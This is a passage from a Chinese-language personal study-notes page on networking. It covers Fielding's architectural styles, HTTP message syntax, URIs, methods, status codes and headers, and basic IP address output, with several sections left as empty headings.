协议的包经过一个二层设备，二层设备收进去的是整个网络包</p></li></ul><h2 id="架构设计">架构设计</h2><h3 id="设计原则">设计原则</h3><h4 id="关键架构属性">关键架构属性</h4><ul><li>性能 Performance：影响高可用的关键因素</li><li>可伸缩性 Scalability：支持部署可以互相交互的大量组件</li><li>简单性 Simplicity：易理解、易实现、易验证</li><li>可见性 Visiable：对两个组件间的交互进行监视或者仲裁的能力。如缓存、分层设计等</li><li>可移植性 Portability：在不同的环境下运行的能力</li><li>可靠性 Reliability：出现部分故障时，对整体影响的程度</li><li>可修改性 Modifiability：对系统作出修改的难易程度，由可进化性、可定制性、可扩展性、可配置性、可重用性构成</li></ul><h4 id="架构属性：性能">架构属性：性能</h4><ul><li><p>网络性能 <code>Network Performance</code></p><ul><li><p><code>Throughput</code> 吞吐量：小于等于带宽 bandwidth</p></li><li><p><code>Overhead</code> 开销：首次开销，每次开销</p></li></ul></li><li><p>用户感知到的性能 <code>User-perceived Performance</code></p><ul><li><p><code>Latency</code> 延迟：发起请求到接收到响应的时间</p></li><li><p><code>Completion</code> 完成时间：完成一个应用动作所花费的时间</p></li></ul></li><li><p>网络效率 <code>Network Efficiency</code></p><ul><li>重用缓存、减少交互次数、数据传输距离更近、COD</li></ul></li></ul><p>​</p><h4 id="架构属性：可修改性">架构属性：可修改性</h4><ul><li><p>可进化性 Evolvability：一个组件独立升级而不影响其他组件</p></li><li><p>可扩展性 Extensibility ：向系统添加功能，而不会影响到系统的其他部分</p></li><li><p>可定制性 Customizability ：临时性、定制性地更改某一要素来提供服务，不对常规客户产生影响</p></li><li><p>可配置性 Configurability ：应用部署后可通过修改配置提供新的功能</p></li><li><p>可重用性 Reusabilit ：组件可以不做修改在其他应用在使用</p></li></ul><p>​</p><h3 id="架构风格">架构风格</h3><h4 id="数据流风格">数据流风格</h4><ul><li><p>数据流风格 <code>Data-flow Styles</code></p></li><li><p>优点：简单性、可进化性、可扩展性、可配置性、可重用性</p></li><li><p>管道与过滤器（Pipe And Filter，PF）</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220606-pf.png" alt=""></p><ul><li>每个 Filter 都有输入端和输出端，只能从输入端读取数据，处理后再从输出端产生数据</li></ul></li><li><p>统一接口的管道与过滤器（Uniform Pipe And Filter，UPF）</p><ul><li>在 PF 上增加了统一接口的约束，所有 Filter 过滤器必须具备同样的接口</li></ul></li><li><p>两种架构对架构属性的影响</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220606-pf-and-upf.png" alt=""></p></li><li><p>例如：协议分层</p></li></ul><h4 id="复制风格">复制风格</h4><ul><li><p>复制风格 <code>Replication Styles</code></p></li><li><p>优点：用户可察觉的性能、可伸缩性，网络效率、可靠性也可以提到提升</p></li><li><p>复制仓库（Replicated Repository, RR）</p><ul><li>多个进程提供相同的服务，通过反向代理对外提供集中服务</li><li>例如：MySQL 冷热备份</li></ul></li><li><p>缓存 $</p><ul><li>RR 的变体，通过复制请求的结果，为后续请求复用</li></ul></li><li><p>两种架构对架构属性的影响</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220606-rr-and-cache.png" alt=""></p></li></ul><h4 id="分层风格">分层风格</h4><ul><li><p>分层风格 <code>Hierarchical Styles</code></p></li><li><p>优点：简单性、可进化性、可伸缩性</p></li><li><p>客户端服务器（Client-Server，CS）</p><ul><li>由 Client 触发请求，Server 监听到请求后产生响应，Client 一直等待收到响应后，会话结束</li><li>分离关注点隐藏细节，良好的简单性、可伸缩性、可进化性</li><li>示例：<a href="https://night-candle.github.io/2021/02/04/cs-network-socket/#1-1-1-%E5%AE%A2%E6%88%B7%E7%AB%AF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B">客户端 - 服务器网络模型</a></li></ul></li><li><p>分层系统（Layered System，LS）</p><ul><li>每一层为其之上的层服务，并使用在其之下的层所提供的服务</li><li>例如 TCP/IP</li></ul></li><li><p>分层客户端服务器（Layered Client-Server，LCS）</p><ul><li>LS+CS</li><li>例如正向代理和反向代理，从空间上分为外部层与内部层</li></ul></li><li><p>无状态、客户端服务器（Client-Stateless-Server，CSS）</p><ul><li><p>基于 CS，服务器上不允许有session state会话状态</p></li><li><p>提升了可见性、可伸缩性、可靠性，但重复数据导致降低网络性能</p></li></ul></li><li><p>缓存、无状态、客户端服务器（Client-Cache-Stateless-Server，C$SS）</p><ul><li>提升性能</li></ul></li><li><p>分层、缓存、无状态、客户端服务器（Layered-Client-Cache-Stateless-Server，LC$SS）</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220606-LC%24SS.png" alt=""></p></li><li><p>远程会话（<strong>Remote Session</strong>，RS）</p><ul><li>CS 变体，服务器保存 Application state 应用状态</li><li>可伸缩性、可见性差</li><li>例如：FTP</li></ul></li><li><p>远程数据访问（<strong>Remote Data Access</strong>，RDA）</p><ul><li><p>CS 变体， Application state 应用状态同时分布在客户端与服务器</p></li><li><p>巨大的数据集有可能通过迭代而减少</p></li><li><p>简单性、可伸缩性差</p></li><li><p>例如：SQL 访问数据库</p></li></ul></li><li><p>对架构属性的影响</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220606-hierarchical-styles.png" alt=""></p></li></ul><h4 id="移动代码风格">移动代码风格</h4><ul><li><p>移动代码风格 <code>Mobile Code Styles</code>，执行的代码可移动</p></li><li><p>优点：可移植性、可扩展性、网络效率</p></li><li><p>虚拟机（Virtual Machine，VM）</p><ul><li>分离指令与实现</li></ul></li><li><p>远程求值（Remote Evaluation，REV）</p><ul><li>基于 CS 的 VM，将代码发送至服务器执行</li><li>例如：JS</li></ul></li><li><p>按需代码（Code on Demand，COD）</p><ul><li><p>服务器在响应中发回处理代码，在客户端执行</p></li><li><p>优秀的可扩展性和可配置性，提升用户可察觉性能和网络效率</p></li></ul></li><li><p>分层、按需代码、缓存、无状态、客户端服务器</p><p>（Layered-Code-on-Demand-Client-Cache-Stateless-Server，LCODC$SS）</p><ul><li>LC$SS+COD</li></ul><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220606-LC%24SS%2BCOD.png" alt="统一接口的 LC$SS+COD"></p></li><li><p>移动代理（Mobile Agent，MA）</p><ul><li>相当于 REV+COD</li></ul></li><li><p>对架构属性的影响</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220606-mobile-code-styles.png" alt=""></p></li></ul><h4 id="点对点风格">点对点风格</h4><ul><li><p>点对点风格 <code>Peer-to-Peer Styles</code></p></li><li><p>优点：可进化性、可重用性、可扩展性、可配置性</p></li><li><p>Event-based Integration，EBI：</p><ul><li><p>基于事件集成系统，如由类似 Kafka 这样的消息系统 + 分发订阅来消除耦合</p></li><li><p>优秀的可重用性、可扩展性、可进化性</p></li><li><p>缺乏可理解性，收到一条消息不知道是哪个订阅产生的</p></li><li><p>由于消息广播等因素造成的消息风暴，可伸缩性差</p></li></ul></li><li><p>Chiron-2，C2</p><ul><li>参见论文《A Component- and Message-Based Architectural Style for GUI Software》</li><li>相当于 EBI+LCS，控制了消息的方向</li></ul></li><li><p>Distributed Objects，DO</p><ul><li>组件结对交互</li></ul></li><li><p>Brokered Distributed Objects，BDO</p><ul><li>引入名字解析组件来简化 DO，例如 CORBA</li></ul></li><li><p>对架构属性的影响</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220606-peer-to-peer-styles.png" alt=""></p></li></ul><h1>应用层</h1><h2 id="HTTP">HTTP</h2><p>HTTP 协议（<code>Hypertext Transfer Protocol</code> ）</p><p>  <em>a stateless application-level request/response protocol that uses extensible semantics and self-descriptive message payloads for flexible interaction with network-based hypertext information systems</em>（RFC7230 2014.6）</p><p>  一种<strong>无状态</strong>的、应用层的、以<strong>请求/应答方式</strong>运行的协议，它使用<strong>可扩展的语义和自描述消息格式</strong>，与基于网络的<strong>超文本</strong>信息系统灵活的互动</p><p>​</p><h3 id="HTTP-1-的设计">HTTP/1 的设计</h3><h4 id="HTTP-解决了什么问题？">HTTP 解决了什么问题？</h4><blockquote><p><em>Web’s major goal was to be a shared information space through which people and machines could communicate.</em> ——Tim Berners Lee</p></blockquote><ul><li><p><strong>Form Follows Function</strong>：HTTP 协议为什么是现在这个样子？</p></li><li><p>解决 WWW 信息交互必须面对的需求：</p><ul><li><p>低门槛</p></li><li><p>可扩展性：巨大的用户群体，超长的寿命</p></li><li><p>分布式系统下的 Hypermedia：大粒度数据的网络传输</p></li><li><p>Internet 规模</p><ul><li>无法控制的 scalability：不可预测的负载、非法格式的数据、恶意消息和客户端不能保持所有服务器信息、服务器不能保持多个请求间的状态信息</li></ul></li><li><p>独立的组件部署：新老组件并存</p></li><li><p>向前兼容：自 1993 年起 HTTP0.9\1.0（1996）已经被广泛使用</p></li></ul></li></ul><h4 id="REST-架构">REST 架构</h4><ul><li><p><em>Roy Thomas Fielding</em> 在 2000 年发布指导 HTTP/1.1 规范制订的论文</p><ul><li>《Architectural Style and the Design of Network-based Software Architectures》</li><li>即常说的 Representational State Transfer（REST）架构</li></ul></li><li><p>风格演化</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210522-evolution.png" alt="推导 REST 架构"></p></li><li><p>REST 架构下 Web</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210522-rest.png" alt=""></p></li></ul><h3 id="协议通用规则">协议通用规则</h3><h4 id="消息格式">消息格式</h4><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210522-message-format.jpg" style="zoom:60%;"><p>基于<strong>ABNF</strong>语义定义的HTTP消息格式：</p><p><strong>HTTP-message = <font color="#ff8378">start-line</font> *( <font color="#2abfb0">header-field</font> CRLF ) CRLF [ <font color="#83b2cc">message-body</font> ]</strong></p><ul><li><font color="#ff8378"><strong>start-line</strong></font> = request-line / status-line<ul><li><strong>request-line</strong> = method SP request-target SP HTTP-version CRLF</li><li><strong>status-line</strong> = HTTP-version SP status-code SP reason-phrase CRLF</li></ul></li><li><font color="#2abfb0"><strong>header-field</strong></font> = field-name “:” OWS field-value OWS<ul><li><p>OWS = *(SP / HTAB）</p></li><li><p>field-name = token</p></li><li><p>field-value =  *(field-content /obs-fold）</p></li></ul></li><li><font color="#83b2cc"><strong>message-body</strong></font> = *OCTET</li></ul><blockquote><p><code>ABNF</code> <strong>扩充巴科斯 - 瑙尔范式</strong>：定义语法的元语言</p><ul><li><p>操作符</p><ul><li>空白字符：用来分隔定义中的各个元素<ul><li>e.g.method SP request-target SP HTTP-version CRLF</li></ul></li><li>选择 <strong>/</strong>：表示多个规则都是可供选择的规则<ul><li>e.g.start-line = request-line / status-line</li></ul></li><li>值范围 <strong>%c##-##</strong><ul><li>e.g.OCTAL = “0” / “1” / “2” / “3” / “4” / “5” / “6” / “7” 与 OCTAL = %x30-37 等价</li></ul></li><li>序列组合 <strong>()</strong>：将规则组合起来，视为单个元素</li><li>不定量重复 <strong>m*n</strong><ul><li>e.g.*元素表示零个或更多元素： *( header-field CRLF )</li><li>e.g.1* 元素表示一个或更多元素，2*4 元素表示两个至四个元素</li></ul></li><li>可选序列 <strong>[]</strong>：<ul><li>e.g.[ message-body ]</li></ul></li></ul></li><li><p>核心规则</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210522-core-rules.png" alt=""></p></li></ul></blockquote><ul><li><p>报文示例</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210526-request-line.png" style="zoom:80%;"><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210526-status-line.png" alt="" style="zoom:80%;"><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210522-message-instance.png" alt=""></p></li></ul><h4 id="URI">URI</h4><h5 id="什么是URI-？">什么是URI ？</h5><ul><li><p>URL：<code>Uniform Resource Locator</code>，表示资源的位置， 期望提供查找资源的方法  （RFC1738 1994.12）</p></li><li><p>URN：<code>Uniform Resource Name</code>，期望为资源提供持久的、位置无关的标识方式，并允许简单地将多个命名空间映射到单个URN命名空间 （RFC2141 1997.5）</p><ul><li>e.g. <strong>磁力链接</strong> magnet:?xt=urn:sha1:YNCKHTQC5C</li></ul></li><li><p><strong>URI</strong>：<code>Uniform Resource Identifier</code>，用以区分资源，<strong>是 URL 和 URN 的超集</strong>，用以取代 URL 和 URN 概念 （RFC1630 1994.6）（RFC3986 2005.1 取代 RFC2396 和 RFC2732）</p></li><li><p>Resource 资源</p><ul><li>可以是图片、文档，也可以是不能通过互联网访问的实体，例如人、公司，也可以是抽象的概念，例如亲属关系或者数字符号</li><li>一个资源可以有多个 URI</li></ul></li><li><p>Identifier 标识符</p><ul><li>将当前资源与其他资源区分开的名称</li></ul></li><li><p>Uniform 统一</p><ul><li>允许不同种类的资源在同一上下文中出现</li><li>对不同种类的资源标识符可以使用同一种语义进行解读</li><li>引入新标识符时，不会对已有标识符产生影响</li><li>允许同一资源标识符在不同的、internet 规模下的上下文中出现</li></ul></li></ul><p>​</p><p>​</p><p><strong>URI 组成：schema, user information, host, port, path, query, fragment</strong></p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210526-URI.png" alt=""></p><p>​</p><h5 id="URI-的格式">URI 的格式</h5><p><strong>URI = <code>scheme</code> “:” <code>hier-part</code> [ “?” <code>query</code> ] [ “#” <code>fragment</code> ]</strong></p><ul><li><p><strong><code>scheme</code></strong> = ALPHA *( ALPHA / DIGIT / “+” / “-” / “.” )<br>e.g. http, https, ftp, mailto, rtsp, file, telnet</p></li><li><p><strong><code>query</code></strong> = *( pchar / “/” / “?” )</p></li><li><p><strong><code>fragment</code></strong> = *( pchar / “/” / “?” )</p></li><li><p><strong><code>hier-part</code></strong> = “//” <strong><code>authority</code></strong> path-abempty / path-absolute / path-rootless / path-empty</p><ul><li><p><strong>authority</strong> = [ userinfo “@” ] host [ “:” port ]</p><p>userinfo = *( unreserved / pct-encoded / sub-delims / “:” )</p><p>host = IP-literal / IPv4address / reg-name</p><p>port = *DIGIT</p></li><li><p><strong>path</strong> = path-abempty/ path-absolute/ path-noscheme / path-rootless / path-empty</p><p>path-abempty = *( “/” segment ) ：以/开头的路径或者空路径</p><p>path-absolute = “/” [ segment-nz *( “/” segment ) ] ：以/开头的路径，但不能以//开头</p><p>path-noscheme = segment-nz-nc *( “/” segment ) ：以非:号开头的路径</p><p>path-rootless = segment-nz *( “/” segment ) ：相对path-noscheme，增加允许以:号开头的路径</p><p>path-empty = 0&lt;pchar&gt; ：空路径</p></li></ul></li></ul><p>​</p><p><strong>相对URI</strong></p><p><strong>URI-reference = <code>URI</code>/<code>relative-ref</code></strong></p><ul><li><strong><code>relative-ref</code></strong> = relative-part [ “?” query ] [ “#” fragment ]<ul><li>relative-part = “//” authority path-abempty / path-absolute / path-noscheme / path-empty</li></ul></li></ul><p>​</p><p>​</p><h5 id="URI-编码">URI 编码</h5><p>​</p><p>​</p><h4 id="方法">方法</h4><p><strong>常见方法（RFC7231）</strong></p><ul><li><p><strong>GET</strong>：主要的获取信息方法，大量的性能优化都针对该方法，幂等方法</p></li><li><p>HEAD：类似 GET 方法，但服务器不发送 BODY，用以获取 HEAD 元数据，幂等方法</p></li><li><p><strong>POST</strong>：常用于提交 HTML FORM 表单、新增资源等</p></li><li><p>PUT：更新资源，带条件时是幂等方法</p></li><li><p>DELETE：删除资源，幂等方法</p></li><li><p>CONNECT：建立 tunnel 隧道</p></li><li><p>OPTIONS：显示服务器对访问资源支持的方法，幂等方法</p></li><li><p>TRACE：回显服务器收到的请求，用于定位问题。有安全风险</p></li></ul><p>​</p><p><strong>用于文档管理的 WEBDAV 方法（RFC2518）</strong></p><ul><li><p>PROPFIND：从 Web 资源中检索以 XML 格式存储的属性。它也被重载，以允许一个检索远程系统的集合结构（也叫目录层次结构）</p></li><li><p>PROPPATCH：在单个原子性动作中更改和删除资源的多个属性</p></li><li><p>MKCOL：创建集合或者目录</p></li><li><p>COPY：将资源从一个 URI 复制到另一个 URI</p></li><li><p>MOVE：将资源从一个 URI 移动到另一个 URI</p></li><li><p>LOCK：锁定一个资源。WebDAV 支持共享锁和互斥锁。</p></li><li><p>UNLOCK：解除资源的锁定</p></li></ul><p>​</p><p>​</p><h4 id="响应行">响应行</h4><p><strong>status-line = HTTP-version SP <code>status-code</code> SP <code>reason-phrase</code> CRLF</strong></p><ul><li><p><strong><code>status-code</code></strong> = 3DIGIT</p></li><li><p><strong><code>reason-phrase</code></strong> = *( HTAB / SP / VCHAR / obs-text )</p></li></ul><p>​</p><h4 id="响应码">响应码</h4><ul><li>响应码规范：（RFC6585 2012.4）（RFC7231 2014.6）</li></ul><p><code>1xx</code>：信息性状态码，请求已接收到，需要进一步处理才能完成，HTTP1.0 不支持</p><ul><li><p>100 Continue：上传大文件前使用</p><ul><li>由客户端发起请求中携带 Expect: 100-continue 头部触发</li></ul></li><li><p>101 Switch Protocols：协议升级使用</p><ul><li>由客户端发起请求中携带 Upgrade: 头部触发，如升级 websocket 或者 http/2.0</li></ul></li><li><p>102 Processing：WebDAV 请求可能包含许多涉及文件操作的子请求，需要很长时间才能完成请求。该代码表示服务器已经收到并正在处理请求，但无响应可用。这样可以防止客户端超时，并假设请求丢失</p></li></ul><p>​</p><p><code>2xx</code>：成功处理请求</p><ul><li><p>200 OK: 成功返回响应。</p></li><li><p>201 Created: 有新资源在服务器端被成功创建。</p></li><li><p>202 Accepted: 服务器接收并开始处理请求，但请求未处理完成。这样一个模糊的概念是有意如此设计，可以覆盖更多的场景。例如异步、需要长时间处理的任务。</p></li><li><p>203 Non-Authoritative Information：当代理服务器修改了 origin server 的原始响应包体时（例如更换了HTML中的元素值），代理服务器可以通过修改200为203的方式告知客户端这一事实，方便客户端为这一行为作出相应的处理。 203响应可以被缓存。</p></li><li><p>204 No Content：成功执行了请求且不携带响应包体，并暗示客户端无需更新当前的页面视图。</p></li><li><p>205 Reset Content：成功执行了请求且不携带响应包体，同时指明客户端需要更新当前页面视图。</p></li><li><p>206 Partial Content：使用 range 协议时返回部分响应内容时的响应码</p></li><li><p>207 Multi-Status：RFC4918 ，在 WEBDAV 协议中以 XML 返回多个资源的状态。</p></li><li><p>208 Already Reported：RFC5842 ，为避免相同集合下资源在207响应码下重复上报，使用 208 可以使用父集合的响应码。</p></li></ul><p>​</p><p><code>3xx</code>：<strong>重定向</strong>使用 Location 指向的资源或者缓存中的资源。在 RFC2068 中规定客户端重定向次数不应超过 5 次，以防止死循环。</p><ul><li><p>300 Multiple Choices：资源有多种表述，通过 300 返回给客户端后由其自行选择访问哪一种表述。由于缺乏明确的细节，300 很少使用。</p></li><li><p>301 Moved Permanently：资源永久性的重定向到另一个 URI 中。</p></li><li><p>302 Found：资源临时的重定向到另一个 URI 中。</p></li><li><p>303 See Other：重定向到其他资源，常用于 POST/PUT 等方法的响应中。</p></li><li><p>304 Not Modified：当客户端拥有可能过期的缓存时，会携带缓存的标识 etag、时间等信息询问服务器缓存是否仍可复用，而304是告诉客户端可以复用缓存。</p></li><li><p>307 Temporary Redirect：类似302，但明确重定向后请求方法必须与原请求方法相同，不得改变。</p></li><li><p>308 Permanent Redirect：类似301，但明确重定向后请求方法必须与原请求方法相同，不得改变。</p></li></ul><p>​</p><p><code>4xx</code>：<strong>客户端出现错误</strong>，服务器无法处理请求</p><ul><li><p>400 Bad Request：服务器认为客户端出现了错误，但不能明确判断为以下哪种错误时使用此错误码。例如HTTP请求格式错误。</p></li><li><p>401 Unauthorized：用户认证信息缺失或者不正确，导致服务器无法处理请求。</p></li><li><p>407 Proxy Authentication Required：对需要经由代理的请求，认证信息未通过代理服务器的验证</p></li><li><p>403 Forbidden：服务器理解请求的含义，但没有权限执行此请求</p></li><li><p>404 Not Found：服务器没有找到对应的资源</p></li><li><p>410 Gone：服务器没有找到对应的资源，且明确的知道该位置永久性找不到该资源响应码分类： 4xx（二）</p></li><li><p>405 Method Not Allowed：服务器不支持请求行中的 method 方法</p></li><li><p>406 Not Acceptable：对客户端指定的资源表述不存在（例如对语言或者编码有要求），服务器返回表述列表供客户端选择。</p></li><li><p>408 Request Timeout：服务器接收请求超时</p></li><li><p>409 Conflict：资源冲突，例如上传文件时目标位置已经存在版本更新的资源</p></li><li><p>411 Length Required：如果请求含有包体且未携带 Content-Length 头部，且不属于chunk类请求时，返回 411响应码分类： 4xx（三）</p></li><li><p>412 Precondition Failed：复用缓存时传递的 If-Unmodified-Since 或 If-None-Match 头部不被满足</p></li><li><p>413 Payload Too Large/Request Entity Too Large：请求的包体超出服务器能处理的最大长度</p></li><li><p>414 URI Too Long：请求的 URI 超出服务器能接受的最大长度</p></li><li><p>415 Unsupported Media Type：上传的文件类型不被服务器支持</p></li><li><p>416 Range Not Satisfiable：无法提供 Range 请求中指定的那段包体</p></li><li><p>417 Expectation Failed：对于 Expect 请求头部期待的情况无法满足时的</p></li><li><p>421 Misdirected Request：服务器认为这个请求不该发给它，因为它没有能力处理。</p></li><li><p>426 Upgrade Required：服务器拒绝基于当前 HTTP 协议提供服务，通过Upgrade 头部告知客户端必须升级协议才能继续处理。</p></li><li><p>428 Precondition Required：用户请求中缺失了条件类头部，例如 If-Match</p></li><li><p>429 Too Many Requests：客户端发送请求的速率过快</p></li><li><p>431 Request Header Fields Too Large：请求的 HEADER 头部大小超过限制</p></li><li><p>451 Unavailable For Legal Reasons：RFC7725 ，由于法律原因资源不可访问响应码分类： 5xx（一）</p></li></ul><p>​</p><p><code>5xx</code>：<strong>服务器端出现错误</strong>，服务器处理请求出错</p><ul><li><p>500 Internal Server Error：服务器内部错误，且不属于以下错误类型</p></li><li><p>501 Not Implemented：服务器不支持实现请求所需要的功能</p></li><li><p>502 Bad Gateway：代理服务器无法获取到合法响应</p></li><li><p>503 Service Unavailable：服务器资源尚未准备好处理当前请求</p></li><li><p>504 Gateway Timeout：代理服务器无法及时的从上游获得响应</p></li><li><p>505 HTTP Version Not Supported：请求使用的 HTTP 协议版本不支持</p></li><li><p>507 Insufficient Storage：服务器没有足够的空间处理请求</p></li><li><p>508 Loop Detected：访问资源时检测到循环</p></li><li><p>511 Network Authentication Required：代理服务器发现客户端需要进行身份验证才能获得网络访问权限</p></li></ul><h4 id="首部字段">首部字段</h4><p>首部字段名：字段值</p><p>单个HTTP首部字段可以有多个值</p><h5 id="请求首部字段">请求首部字段</h5><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Ccs-network-protocol%5Cimage-20210529211824419.png" alt="image-20210529211824419"></p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Ccs-network-protocol%5Cimage-20210529211839057.png" alt="image-20210529211839057"></p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Ccs-network-protocol%5Cimage-20210529212037624.png" alt="image-20210529212037624"></p><h5 id="响应首部字段">响应首部字段</h5><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Ccs-network-protocol%5Cimage-20210529212109514.png" alt="image-20210529212109514"></p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Ccs-network-protocol%5Cimage-20210529212121189.png" alt="image-20210529212121189"></p><h5 id="通用首部字段General-Header-Fields">通用首部字段General Header Fields</h5><p>请求和响应报文两方都会使用的首部字段</p><table><thead><tr><th>首部字段名</th><th>说明</th></tr></thead><tbody><tr><td><strong>Cache-Control</strong></td><td>控制缓存</td></tr><tr><td><strong>Connection</strong></td><td>连接管理、逐条首部</td></tr><tr><td>Upgrade</td><td>升级为其他协议</td></tr><tr><td><strong>via</strong></td><td>代理服务器的相关信息</td></tr><tr><td>Wraning</td><td>错误和警告通知</td></tr><tr><td>Transfor-Encoding</td><td>报文主体的传输编码格式</td></tr><tr><td>Trailer</td><td>报文末端的首部一览</td></tr><tr><td>Pragma</td><td>报文指令</td></tr><tr><td><strong>Date</strong></td><td>创建报文的日期</td></tr></tbody></table><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Ccs-network-protocol%5Cimage-20210529211513608.png" alt="image-20210529211513608"></p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Ccs-network-protocol%5Cimage-20210529211746384.png" alt="image-20210529211746384"></p><h5 id="实体首部字段">实体首部字段</h5><table><thead><tr><th>首部字段名</th><th>说明</th></tr></thead><tbody><tr><td><strong>Allow</strong></td><td>资源可支持的HTTP方法</td></tr><tr><td>Content-Language</td><td>实体的资源语言</td></tr><tr><td>Content-Encoding</td><td>实体的编码格式</td></tr><tr><td><strong>Content-Length</strong></td><td>实体的大小（字节）</td></tr><tr><td><strong>Content-Type</strong></td><td>实体媒体类型</td></tr><tr><td>Content-MD5</td><td>实体报文的摘要</td></tr><tr><td>Content-Location</td><td>代替资源的URI</td></tr><tr><td>Content-Rnages</td><td>实体主体的位置范围</td></tr><tr><td>Last-Modified</td><td>资源最后的修改时间</td></tr><tr><td>Expires</td><td>实体主体的过期时间</td></tr></tbody></table><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Ccs-network-protocol%5Cimage-20210529212151372.png" alt="image-20210529212151372"></p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Ccs-network-protocol%5Cimage-20210529212200529.png" alt="image-20210529212200529"></p><h3 id="连接与消息的路由">连接与消息的路由</h3><h3 id="内容协商与传输">内容协商与传输</h3><p>每个 URI 指向的资源可以是任何事物，可以有多种不同的表述，例如一份文档可以有不同语言的翻译、不同的媒体格式、可以针对不同的浏览器提供不同的压缩编码等。</p><h3 id="Cookie-的设计与问题">Cookie 的设计与问题</h3><h3 id="缓存的控制">缓存的控制</h3><p>​</p><p>​</p><p>​</p><h2 id="WebSocket">WebSocket</h2><blockquote><p>支持服务器推送消息</p></blockquote><p>WebSocket是基于TCP的应用层协议，用于在C/S架构的应用中实现<strong>双向通信</strong>。RFC6455（2011.12）</p><p>• 双向通讯的优劣？</p><p>• 如何管理会话？</p><p>• 如何维持长连接？</p><p>• 兼容 HTTP 协议</p><p>• 端口复用</p><p>• 支持扩展</p><p>• 如 permessage-deflate 扩展</p><p>建立会话<br>• 消息传输<br>• 心跳<br>• 关闭会话</p><p>​</p><p>​</p><p>​</p><h2 id="HTTP-2-0">HTTP/2.0</h2><p>​</p><p>​</p><p>​</p><h2 id="TLS-SSL">TLS/SSL</h2><blockquote><p>应用层的安全基础设施</p></blockquote><p>​</p><p>​</p><p>​</p><h1>传输层</h1><h2 id="TCP">TCP</h2><h3 id="概述-6">概述</h3><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210127-tcp-development-history.png" alt="发展历史"></p><h3 id="建立连接">建立连接</h3><h3 id="传输数据">传输数据</h3><h3 id="拥塞控制">拥塞控制</h3><h3 id="关闭连接">关闭连接</h3><h2 id="UDP">UDP</h2><p>​</p><p>​</p><h1>网络层</h1><p>​</p><h2 id="IP-协议">IP 协议</h2><blockquote><p><strong>IP 地址是一个网卡在网络世界的通讯地址</strong>，相当于我们现实世界的门牌号码。IP 是地址，有定位功能，MAC 是身份证，无定位功能。</p></blockquote><p>​</p><h3 id="IP地址">IP地址</h3><h4 id="查看-IP-地址">查看 IP 地址</h4><p>Windows： <code>ipconfig</code></p><p>Linux： <code>ifconfig</code>、 <code>ip addr</code></p><blockquote><p>大多数时候这两个命令系统自带。如果登录进入一个被裁剪过的非常小的 Linux 系统中，既没有 ifconfig 命令，也没有 ip addr 命令，可以自行安装 <strong>net-tools</strong> 和 <strong>iproute2</strong> 两个工具</p></blockquote><p><strong>net-tools</strong>起源于BSD，自2001年起，Linux社区已经对其停止维护，而<strong>iproute2</strong>旨在取代<strong>net-tools</strong>，并提供了一些新功能。一些Linux发行版已经停止支持<strong>net-tools</strong>，只支持<strong>iproute2</strong>。</p><p><strong>net-tools</strong>通过<code>procfs(/proc)</code>和<code>ioctl</code>系统调用去访问和改变内核网络配置，而<strong>iproute2</strong>则通过<code>netlink</code>套接字接口与内核通讯。</p><p><img src="image-20210208174338316.png" alt="运行ip addr"></p><hr><p><strong>lo</strong> 全称是 <code>loopback</code> ，又称<strong>环回接口</strong>，往往会被分配到 <strong>127.0.0.1</strong> 这个地址。这个地址用于本机通信，经过内核处理后直接返回，不会在任何网络中出现。</p><p><strong>10.0.2.15</strong> 就是一个 IP 地址。这个地址被 <code>.</code> 分隔为四个部分，每个部分 8 个 bit，总共 32 位。这样产生的 IP 地址的数量很快就不够用了，于是就有了 IPv6，也就是上面输出结果里面 <strong>fe80::8680:6dc5:6ac2:c92b/64</strong> ，有 128 位。</p><p><strong>scope</strong>在 IP 地址的后面， <code>global</code>说明这张网卡是可以对外的，可以接收来自各个地方的包。 <code>host</code> 说明这张网卡仅仅可以供本机相互通信。</p><p><strong>link/ether fa:16:3e:c7:79:75 brd ff:ff:ff:ff:ff:ff</strong> 被称为<strong>MAC 地址</strong><code>Media Access Control</code>，是一个网卡的物理地址，用十六进制，6 个 byte 表示。MAC 地址的通信范围比较小，局限在一个子网里面。</p><p><strong>&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</strong> 叫作<strong>网络设备的状态标识</strong> <code>net_device flags</code></p><ul><li><code>UP</code> 表示网卡处于启动的状态</li><li><code>BROADCAST</code> 表示这个网卡有广播地址，可以发送广播</li><li><code>MULTICAST</code> 表示网卡可以发送多播包</li><li><code>LOWER_UP</code> 表示 L1 是启动的，即插着网线</li><li><code>MTU1500</code> 指最大传输单元 <code>MTU</code> 为 1500，表示的是链路层包的大小，这是以太网的默认值，规定连 MAC 头带正文合起来，不允许超过 1500 个<strong>字节</strong>。<strong>如果放不下就需要分片来传输。</strong></li></ul><p><strong>qdisc</strong> 是<strong>排队规则</strong><code>queueing 